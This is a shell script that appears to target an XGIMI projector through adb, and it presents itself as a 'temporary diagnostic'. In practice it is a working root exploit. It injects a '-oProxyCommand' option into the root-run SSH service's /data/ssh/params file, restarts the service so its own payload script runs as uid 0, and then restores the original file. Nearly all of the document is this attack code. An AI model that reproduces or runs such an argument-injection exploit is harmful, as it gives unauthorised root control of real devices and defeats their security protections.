#!/system/bin/sh
# Temporary diagnostic only: no key changes, no APK changes, no mounts.
set -eu
umask 077
EXPECTED='XGIMI/Product_dapengfhm/goat_elegant:13/TP1A.220624.021.A1/v6.17.12:user/dev-keys'
[ "$(id -u)" = 2000 ] || { echo 'REFUSED: expected adb shell'; exit 10; }
[ "$(getprop ro.build.fingerprint)" = "$EXPECTED" ] || { echo 'REFUSED: firmware differs'; exit 11; }
[ "$(getprop init.svc.xgimi_ssh)" = running ] || { echo 'REFUSED: SSH not already running'; exit 12; }
[ "$(getprop xgimi.remoteDebug.on)" = true ] || { echo 'REFUSED: debug flag differs'; exit 13; }
[ ! -L /data/ssh ] && [ -d /data/ssh ] || exit 14
[ ! -L /data/ssh/params ] && [ -f /data/ssh/params ] || exit 15
[ "$(stat -c '%u:%a:%s' /data/ssh/params)" = '0:600:0' ] || { echo 'REFUSED: params no longer original empty root file'; exit 16; }
D=/data/ssh/z9x-ru-probe-$(cat /proc/sys/kernel/random/uuid)
mkdir "$D"
chmod 700 "$D"
echo "PROBE_DIR=$D"
echo "RECOVERY_IF_INTERRUPTED: adb shell mv $D/original.params /data/ssh/params"
restore() {
 if [ -f "$D/original.params" ]; then
  if [ ! -e /data/ssh/params ] || cmp -s /data/ssh/params "$D/request.params"; then
   mv "$D/original.params" /data/ssh/params || { echo "RESTORE_FAILED: $D/original.params"; return 1; }
  else
   echo "RESTORE_REFUSED: params changed independently; original preserved at $D/original.params"
   return 1
  fi
 fi
}
trap restore EXIT
trap 'exit 130' HUP INT TERM
cat > "$D/root.sh" <<'ROOT'
#!/system/bin/sh
set -eu
umask 077
D=${0%/*}
[ "$(id -u)" = 0 ] || exit 20
[ -f "$D/original.params" ] && [ ! -L "$D/original.params" ] || exit 21
cmp -s /data/ssh/params "$D/request.params" || exit 22
# Restore the exact original inode/mode before reporting success.
mv "$D/original.params" /data/ssh/params
{ id; cat /proc/self/attr/current; } > "$D/result"
chmod 644 "$D/result"
ROOT
chmod 700 "$D/root.sh"
printf '%s\n' "-oProxyCommand=$D/root.sh -oStrictHostKeyChecking=yes -oUserKnownHostsFile=/dev/null -oGlobalKnownHostsFile=/dev/null -oBatchMode=yes -oConnectTimeout=5 127.0.0.1" > "$D/request.params"
# Prepare a complete replacement before moving the original.
cp "$D/request.params" "$D/armed.params"
chmod 600 "$D/armed.params"
# Save the empty original inode without reading or changing its ownership/mode.
mv /data/ssh/params "$D/original.params"
mv "$D/armed.params" /data/ssh/params
if ! setprop ctl.restart xgimi_ssh; then
 echo 'RESTART_DENIED: original params will be restored; root access NOT verified'
 exit 23
fi
N=0
while [ "$N" -lt 50 ]; do
 if [ -r "$D/result" ] && grep -q '^uid=0' "$D/result"; then
  [ ! -e "$D/original.params" ] || { echo 'REFUSED: original not restored'; exit 24; }
  [ "$(stat -c '%u:%a:%s' /data/ssh/params)" = '0:600:0' ] || { echo 'REFUSED: params restoration differs'; exit 25; }
  cat "$D/result"
  echo 'ROOT_EXECUTION_VERIFIED; ORIGINAL_PARAMS_RESTORED'
  # Clear the old in-memory client arguments by restarting with original empty params.
  if ! setprop ctl.restart xgimi_ssh; then echo 'SECOND_RESTART_DENIED: disk params restored, service may retain old arguments'; fi
  exit 0
 fi
 sleep 0.2
 N=$((N+1))
done
echo 'ROOT_NOT_VERIFIED: restoring original params; no translation installed'
restore
setprop ctl.restart xgimi_ssh || true
exit 26
# End; an extra CR added by a Windows pipeline after this comment is harmless.
